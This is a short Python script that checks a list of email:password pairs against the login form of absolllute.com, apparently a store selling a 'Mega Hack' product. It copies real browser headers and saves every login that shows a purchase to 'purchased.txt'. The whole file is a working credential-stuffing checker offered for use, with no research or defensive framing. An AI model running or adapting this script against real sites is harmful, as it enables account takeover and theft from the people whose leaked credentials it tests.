# also shit code but it works
import requests

with open("accs.txt", "r") as f:
    accs = f.read().splitlines()

headers = {
    'authority': 'absolllute.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,pt;q=0.7',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    'dnt': '1',
    'origin': 'https://absolllute.com',
    'referer': 'https://absolllute.com/store/login',
    'sec-ch-ua': '^\\^Google',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '^\\^Windows^\\^',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
}

for acc in accs: 
    email, password = acc.split(":")
    data = {
        'e': email,
        'p': password
    }

    response = requests.post('https://absolllute.com/store/login', headers=headers, data=data)
    if 'Download Mega Hack' in response.text:
        print(f"{email}:{password} | Purchased")
        f = open("purchased.txt", "a")
        f.write(f"{email}:{password}\n")
    else:
        print(f"{email}:{password} |  Account invalid or not purchased ({response.status_code})")
